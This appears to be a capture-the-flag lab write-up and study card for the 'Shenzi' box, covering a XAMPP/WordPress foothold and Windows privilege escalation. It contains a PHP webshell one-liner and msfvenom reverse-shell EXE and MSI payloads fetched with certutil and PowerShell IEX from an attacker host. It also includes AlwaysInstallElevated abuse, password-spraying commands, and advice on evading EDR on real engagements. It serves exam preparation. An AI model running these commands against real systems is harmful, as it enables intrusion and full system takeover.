title: Shenzi Retrospective — Five Lessons from a XAMPP+WordPress Win
body:
Shenzi was a textbook XAMPP-on-Windows lab box: SMB guest share gave up the WordPress admin password, theme editor gave RCE, PowerUp flagged AlwaysInstallElevated, MSI gave SYSTEM. End-to-end in roughly 90 minutes. Several methodology decisions made it that fast — and one rabbit hole nearly cost time but didn't.

Final proof: 82c4c53e4398f7581ab369fa86274907

— THE FOOTHOLD CHAIN — IN ORDER —

  1. Nmap → 21 (FileZilla), 80/443 (Apache+PHP+XAMPP), 445 (SMB),
     3306 (MariaDB), Windows RPC ports
  2. Hydra against FTP with default-creds list → no hits
  3. HTTP /dashboard/ → 'Welcome to XAMPP' → confirms stack
  4. Directory fuzzing → /shenzi/ → WordPress install
  5. SMB null session → access denied
  6. SMB GUEST session → works, share named 'Shenzi' visible
  7. Download share → passwords.txt with WordPress admin creds
  8. /shenzi/wp-admin → login with admin / FeltHeadwallWight357
  9. Theme editor → twentytwenty/404.php → append simple-backdoor.php
  10. Webshell verifies RCE → msfvenom EXE → certutil download → execute
  11. Reverse shell as shenzi\shenzi (medium integrity)
  12. PowerUp Invoke-AllChecks → AlwaysInstallElevated detected
  13. msfvenom MSI → certutil + msiexec → SYSTEM

— FIVE LESSONS —

  1. KNOWING THE STACK FILESYSTEM = HALF THE BOX
     Every XAMPP install on Windows uses the same paths:
       C:\xampp\htdocs\<sitename>\
       C:\xampp\passwords.txt
       C:\xampp\apache\conf\httpd.conf
       C:\xampp\mysql\data\
     Knowing this means you can:
     - Predict where the deployed app lives (htdocs/<sitename>/)
     - Predict where credentials might leak (passwords.txt)
     - Find configs without enumeration (httpd.conf for vhosts)
     The Shenzi share name matched the app name — both 'shenzi' — which
     is the XAMPP convention. When you see 'Welcome to XAMPP' followed
     by an SMB share or directory matching a name, that's your app.
     Build mental file-tree models of common stacks (XAMPP, LAMP, IIS,
     specific framework defaults). They turn fuzzing into prediction.

  2. GUEST SMB SESSION IS A SEPARATE AUTH PATH FROM NULL
     The instinct: null session fails (`-u '' -p ''`) → 'SMB is locked
     down, move on.' The reality: guest auth (`-u 'guest' -p ''`) is a
     completely separate auth path that often succeeds when null fails.
     XAMPP boxes consistently allow guest. Some Windows configurations
     allow guest by default for certain shares.
     The 30-second test:
       nxc smb $ip -u '' -p '' --shares      # null
       nxc smb $ip -u 'guest' -p '' --shares # guest
     If the second works and the first doesn't, you've gained an entire
     enumeration path for free.

  3. PASSWORDS.TXT IN A SHARE = INSTANT GIFT
     XAMPP ships with a documented credentials file. Lab box authors
     leave it accessible. ALWAYS LOOK FOR IT FIRST when you see XAMPP.
     The Shenzi share contained:
        passwords.txt          (the gift — WordPress admin in plaintext)
        readme_en.txt          (XAMPP version disclosure)
        sess_klk75u2q4r...     (PHP session — sometimes useful)
        why.tmp                (lab-author note, sometimes a hint)
        xampp-control.ini      (control panel config)
     Reading passwords.txt before doing anything else with WordPress
     saved 30+ minutes of brute-force attempts.
     Generalize: when downloading files from any share, READ THEM ALL.
     The next step is often disclosed.

  4. POWERUP > MANUAL ENUMERATION FOR WINDOWS PRIVESC
     PowerUp's Invoke-AllChecks runs every common Windows privesc check
     in 30-60 seconds. Manual enumeration of the same checks would take
     30+ minutes. Always run PowerUp first on any Windows foothold:
        powershell -ep bypass -c "IEX(IWR 'http://KALI/PowerUp.ps1' \
                                    -UseBasicParsing); Invoke-AllChecks"
     The output's AbuseFunction field is copy-paste-ready — you don't
     even need to figure out exploitation details, just run what PowerUp
     suggests.
     On Shenzi, PowerUp flagged AlwaysInstallElevated immediately. The
     finding included AbuseFunction: Write-UserAddMSI — exploit done in
     two more commands.
     Pair PowerUp with whoami /priv (different findings, both essential).

  5. THE NMAP-TO-TARGETED-SCAN ONE-LINER SAVES TIME EVERY BOX
     The recurring problem: full port scan finds 15 open ports, you
     need to feed those ports to a follow-up scan.
     The reusable one-liner that converts nmap output to a comma-separated
     port list for the next scan:
        grep -E '^[0-9]+/tcp' scan.nmap | awk '{print $1}' \
          | cut -d '/' -f1 | paste -sd ,
     Output: 21,80,135,139,443,445,3306,...
     Pipe directly into the next scan:
        PORTS=$(grep -E '^[0-9]+/tcp' allports.nmap | awk '{print $1}' \
                | cut -d '/' -f1 | paste -sd ,)
        nmap -sC -sV -p $PORTS $ip -oN targeted.nmap
     30 seconds saved per box × 60 boxes during prep = ~30 min total
     across an exam window. Plus avoids transcription errors.

— THE RABBIT HOLE THAT WASN'T —

  Initial instinct on seeing FileZilla FTP 0.9.41 was to dig for CVEs.
  FileZilla 0.9.41 IS old (2016). There ARE published vulnerabilities.
  But none are reliably exploitable without auth on lab boxes.
  Hydra against FileZilla with default-creds list returned no hits.

  Decision: stop, pivot to web. Took 5 minutes total on FTP.
  Later, with shell, we saw FileZilla wasn't actually the path —
  WordPress + AlwaysInstallElevated was.

  Lesson: a service can be 'old and probably exploitable' AND 'not the
  path on this box.' Set timers (5-10 min on each enumeration vector),
  pivot when nothing surfaces, return only if other paths fail.

— THE REUSABLE WINDOWS LAB CHAIN —

  Every XAMPP-on-Windows lab box you'll see follows this skeleton:

  Recon:
    nmap → ports including 80/443/445/21/3306
    HTTP → /dashboard/ confirms XAMPP
    Directory fuzz → /<sitename>/ reveals deployed app

  Foothold:
    SMB null + guest enum → look for passwords.txt
    OR wpscan brute force with default creds first
    → WordPress admin login
    → theme editor 404.php → webshell
    → reverse shell

  Privesc:
    PowerUp Invoke-AllChecks → typically finds:
      AlwaysInstallElevated, OR
      Modifiable Service, OR
      Unquoted Service Path
    → MSI / service-replace / DLL hijack → SYSTEM

  This skeleton applies to roughly 40% of Windows lab boxes. Memorize
  it. The specific vulnerability rotates; the methodology doesn't.

— TIME BREAKDOWN (REAL SHENZI RUN) —

  Recon phase (nmap, fuzz, SMB enum):           ~25 min
  passwords.txt → WP admin → webshell:           ~15 min
  Reverse shell delivery (msfvenom + listener):  ~10 min
  PowerUp + AlwaysInstallElevated → SYSTEM:      ~15 min
  Documentation:                                  ~25 min
  Total: ~90 min

  Future-self running this pattern again should take 45-60 minutes.
  XAMPP filesystem knowledge is the multiplier — without it, fuzzing
  for the deployed app and credentials would have added 30+ minutes.
cmd:
# ── REUSABLE SHENZI-PATTERN CHAIN ────────────────────

# Stage 1: Recon — XAMPP detection + app discovery
export ip=TARGET_IP
export KALI_IP=YOUR_KALI_IP

# Quick fingerprint
curl -sI http://$ip/ | grep -iE 'apache|php'
firefox http://$ip/dashboard/    # confirm XAMPP visually

# Stage 2: SMB enumeration (BOTH null AND guest)
nxc smb $ip -u '' -p '' --shares
nxc smb $ip -u 'guest' -p '' --shares

# If guest works, mount shares and grab everything
for share in $(nxc smb $ip -u 'guest' -p '' --shares 2>&1 | grep -oE '[A-Za-z]+\s+READ' | awk '{print $1}'); do
  echo "=== Downloading $share ==="
  mkdir -p loot/$share
  smbclient -N //$ip/$share <<EOF
    lcd loot/$share
    recurse on
    prompt off
    mget *
EOF
done

# Read everything
for f in loot/*/*; do
  echo "=== $f ==="
  file "$f"
  cat "$f" 2>/dev/null | head -30
  echo
done

# Stage 3: Web app discovery
# Fuzz top-level for the deployed app (XAMPP convention: htdocs/<sitename>)
feroxbuster -u http://$ip/ -d 2 \
  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
  --status-codes 200,301,302,403

# Often the box name matches the app path — try it directly:
box_name='shenzi'   # replace with actual box name
curl -sI http://$ip/$box_name/
curl -sI http://$ip/$box_name/wp-admin/

# Stage 4: WordPress login (creds from passwords.txt)
# Manual login: http://$ip/$box_name/wp-admin
#   admin / <password from passwords.txt>

# Or via curl:
curl -c /tmp/wpcookies -X POST http://$ip/$box_name/wp-login.php \
  -d 'log=admin&pwd=<password>&wp-submit=Log+In' -L

# Stage 5: Theme editor → webshell
# Browser:
#   /wp-admin → Appearance → Theme Editor → 404.php
#   Append: <?php if(isset($_REQUEST['cmd'])){system($_REQUEST['cmd']);die;} ?>

# Verify RCE:
curl "http://$ip/$box_name/wp-content/themes/twentytwenty/404.php?cmd=whoami"

# Stage 6: Reverse shell
# On Kali:
msfvenom -p windows/shell_reverse_tcp LHOST=$KALI_IP LPORT=443 -f exe -o met.exe
python3 -m http.server 80 &
rlwrap -cAr nc -nlvp 443 &

# Trigger via webshell:
WEBSHELL="http://$ip/$box_name/wp-content/themes/twentytwenty/404.php"
curl "${WEBSHELL}?cmd=certutil+-urlcache+-f+http://$KALI_IP/met.exe+C:\Windows\Temp\met.exe"
curl "${WEBSHELL}?cmd=C:\Windows\Temp\met.exe"
# Shell hits listener

# Stage 7: Privesc — PowerUp first
# In the reverse shell:
powershell -ep bypass -c "IEX(IWR 'http://$KALI_IP/PowerUp.ps1' -UseBasicParsing); Invoke-AllChecks"

# Read AlwaysInstallElevated finding → exploit
# Generate MSI on Kali:
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$KALI_IP LPORT=4444 -f msi -o evil.msi

# Transfer + execute on target:
certutil -urlcache -f http://$KALI_IP/evil.msi C:\Windows\Temp\evil.msi
msiexec /quiet /qn /norestart /i C:\Windows\Temp\evil.msi

# Catch SYSTEM shell on a NEW listener (port 4444):
rlwrap -cAr nc -nlvp 4444
# whoami → nt authority\system

# ── PRE-EXAM CHECKLIST FROM SHENZI LESSONS ──────────

# 1. PowerUp.ps1 saved locally
mkdir -p ~/scripts/privesc-windows
cp /usr/share/windows-resources/powersploit/Privesc/PowerUp.ps1 ~/scripts/privesc-windows/

# 2. simple-backdoor.php ready
cp /usr/share/webshells/php/simple-backdoor.php ~/scripts/webshells/

# 3. Nmap port-extraction one-liner saved as a function
cat >> ~/.zshrc <<'EOF'
nmap_ports() {
  # Usage: nmap_ports <nmap_output_file>
  grep -E '^[0-9]+/tcp' "$1" | awk '{print $1}' | cut -d '/' -f1 | paste -sd ,
}
EOF
source ~/.zshrc

# Then on every box:
nmap -p- $ip -oN scan1.nmap
PORTS=$(nmap_ports scan1.nmap)
nmap -sC -sV -p $PORTS $ip -oN targeted.nmap

# 4. msfvenom payload generation aliases
cat >> ~/.zshrc <<'EOF'
alias mvexe='msfvenom -p windows/x64/shell_reverse_tcp -f exe -o met.exe LHOST=$lhost LPORT=$lport'
alias mvmsi='msfvenom -p windows/x64/shell_reverse_tcp -f msi -o evil.msi LHOST=$lhost LPORT=$lport'
EOF

# Set lhost/lport at start of engagement:
export lhost=192.168.45.201
export lport=443
mvexe   # generates met.exe
mvmsi   # generates evil.msi

# 5. WordPress quick-cred list
cat > ~/scripts/wp_quick_pwds.txt <<'EOF'
admin
administrator
password
wordpress
P@ssw0rd
FeltHeadwallWight357
admin123
letmein
changeme
EOF

# Quick wpscan against an unknown WP install
wpscan --url http://$ip/<sitename> -U admin -P ~/scripts/wp_quick_pwds.txt --password-attack xmlrpc-multicall

# ── PORT EXTRACTION ONE-LINER REFERENCE ──────────────
# Manual breakdown (in case the function isn't loaded):

# Step 1: extract the port lines
grep -E '^[0-9]+/tcp' scan.nmap

# Step 2: just the first column (port/proto)
grep -E '^[0-9]+/tcp' scan.nmap | awk '{print $1}'

# Step 3: drop the /tcp suffix
grep -E '^[0-9]+/tcp' scan.nmap | awk '{print $1}' | cut -d '/' -f1

# Step 4: collapse to comma-separated
grep -E '^[0-9]+/tcp' scan.nmap | awk '{print $1}' | cut -d '/' -f1 | paste -sd ,

# Or in one shot using awk only:
awk -F'/' '/^[0-9]+\/tcp/ {printf "%s,", $1}' scan.nmap | sed 's/,$//'
warn:
DON'T SKIP THE GUEST SMB CHECK — IT'S 30 SECONDS:
  Adding `nxc smb $ip -u 'guest' -p ''` to your standard recon adds zero
  cost and surfaces shares that null sessions miss. On Shenzi this was
  the difference between 'no SMB access' and 'WordPress admin password
  in plaintext.' Always run both.

THE BOX NAME IS A HINT — TRY IT AS A PATH/SHARE/USER:
  PG/HTB lab box names frequently match:
  - The SMB share name (Shenzi → //ip/Shenzi)
  - The web app subdirectory (/shenzi/)
  - A username (shenzi user account)
  - The Apache vhost (shenzi.local)
  Spend 30 seconds trying the box name in obvious places before fuzzing.

XAMPP IS WINDOWS-FIRST IN 95%+ OF LAB BOXES:
  When you see Apache + PHP + 'Welcome to XAMPP', assume Windows. The
  Linux variant /opt/lampp exists but is much rarer in labs. Plan your
  payloads (msfvenom -p windows/...) accordingly.

FTP CVE HUNTS ARE OFTEN RABBIT HOLES ON LAB BOXES:
  FileZilla, vsftpd, ProFTPd — old versions of all three have published
  CVEs. Most require auth or specific configurations not present on
  lab boxes. Set a 5-10 minute timer on FTP enumeration:
    1. Anonymous login
    2. Default-creds hydra
    3. Banner check for known-vuln versions
  If none of those produce, MOVE ON. Real exploit chain is almost
  always elsewhere on lab boxes.

POWERUP IS LOUD — ON REAL ENGAGEMENTS, USE SHARPUP:
  PowerUp.ps1 is well-signatured by EDR. Lab boxes don't have EDR.
  Real engagements: SharpUp (compiled C# version) is less commonly
  flagged. Same checks, different delivery.
  Or even better: do the manual checks individually. Slower but
  effectively zero detection signal.

ALWAYS USE -UseBasicParsing WITH IWR:
  PowerShell's Invoke-WebRequest tries to parse responses as HTML by
  default. This sometimes fails (no IE-engine on Server Core). Always
  add -UseBasicParsing:
    IWR 'url' -UseBasicParsing
  Otherwise you may get cryptic 'Internet Explorer engine not available'
  errors that look like network failures.

DOCUMENT EACH PASSWORD YOU FIND — REUSE IS COMMON:
  Lab boxes (and real environments) reuse credentials across services:
    WordPress admin password = SMB user password
    MySQL root password = SSH password
    FTP password = phpMyAdmin password
  Keep a running list per box. Always try captured creds against every
  service you've identified, not just the one they came from.

MSFVENOM x64 vs x86 — MATCH THE TARGET:
  Modern Windows is x64. Default msfvenom payload (windows/shell_reverse_tcp)
  is x86. Wrong arch = MSI installs but payload doesn't fire.
  Always specify x64 for modern Windows:
    -p windows/x64/shell_reverse_tcp
  Confirm target arch first:
    systeminfo | findstr /B /C:'System Type'

CERTUTIL IS UNIVERSAL — INVOKE-WEBREQUEST IS NOT:
  PowerShell IWR fails on:
  - Server Core installs (no IE engine)
  - Constrained Language Mode
  - When AMSI blocks the cmdlet
  certutil -urlcache works on every Windows from XP forward, no
  PowerShell required. Default to certutil for Windows file transfer
  unless you need streaming or have a reason to avoid it.

choices.label: Apply XAMPP fingerprinting on a new box
Apply WordPress shell chain on a new box
Apply PowerUp methodology on Windows foothold
